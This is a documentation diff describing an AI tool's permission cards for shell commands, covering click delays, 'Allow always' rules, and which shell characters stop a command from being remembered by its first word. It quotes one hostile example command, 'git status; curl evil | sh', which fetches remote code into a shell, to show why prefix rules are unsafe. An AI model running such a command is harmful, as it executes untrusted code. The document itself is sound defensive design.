@@ -195,9 +195,14 @@ A permission card appears. Try to click `Allow` the instant it does — you
 cannot, for 350 milliseconds. A card that arrives under a cursor already
 moving towards the composer must not be approvable on the way past.
 
-`Allow always` remembers the command's first word — `Bash:texcount`. A command
-carrying shell syntax (`;`, `|`, `&&`) gets no rule at all and is asked about
-every time, because `git status; curl evil | sh` starts with `git`.
+`Allow always` remembers the command's first word, `Bash:texcount`, and keeps
+it with the project, so a restart does not ask you again. A command carrying
+shell syntax cannot be remembered that way, because `git status; curl evil |
+sh` starts with `git`, so it is remembered by its exact text instead and covers
+nothing else. Seven characters count as shell syntax here, not only the three
+that chain commands: `;`, `&`, `|`, a backtick, `$`, `>` and `<`, plus a
+command written over more than one line. That is why `latexmk > build.log` is
+asked about even with auto mode on, and the card says which of them it found.
 
 *Asserted by: a shell command asks first, and the buttons are not clickable
 instantly; a command that runs more than one command is never remembered.*
